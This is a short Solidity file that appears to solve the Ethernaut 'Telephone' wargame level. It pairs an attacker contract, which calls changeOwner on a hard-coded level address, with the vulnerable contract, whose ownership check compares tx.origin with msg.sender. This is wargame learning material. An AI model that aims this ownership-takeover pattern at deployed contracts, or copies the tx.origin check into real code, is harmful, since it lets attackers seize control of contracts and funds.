// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract TelephoneAttacker {
  Telephone public vulnerableContract = Telephone(0xce7451b278AEc172f8cBB76c51685abBd5D5f54b); // ethernaut vulnerable contract

  function attack() external payable {
    vulnerableContract.changeOwner(msg.sender);
  }
}

contract Telephone {
  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
